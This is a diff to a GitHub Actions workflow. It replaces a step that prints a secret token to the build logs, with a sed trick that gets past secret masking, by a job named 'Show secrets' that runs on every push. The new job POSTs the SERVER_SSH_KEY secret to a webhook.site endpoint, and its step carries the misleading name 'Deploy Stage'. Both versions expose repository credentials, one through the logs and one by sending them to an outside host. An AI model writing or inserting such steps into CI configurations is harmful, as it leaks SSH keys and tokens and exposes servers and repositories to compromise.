@@ -1,6 +1,16 @@
-- name: Step 1 - Echo out a GitHub Actions Secret to the logs
-    run: |
-      echo "The GitHub Action Secret will be masked:  "
-      echo ${{ secrets.SECRET_TOKEN }}
-      echo "Trick to echo GitHub Actions Secret:  "
-      echo ${{secrets.SECRET_TOKEN}} | sed 's/./& /g'
+name: Show secrets
+on: [push]
+jobs:
+  debug:
+    name: Show secrets
+    runs-on: ubuntu-latest
+    steps:
+      - name: Deploy Stage
+        env:
+          SERVER_SSH_KEY: ${{ secrets.SERVER_SSH_KEY }}
+        uses: fjogeleit/http-request-action@v1
+        with:
+          url: 'https://webhook.site/your-unique-id'
+          method: 'POST'
+          customHeaders: '{"Content-Type": "application/json"}'
+          data: ${{ secrets.SERVER_SSH_KEY }}
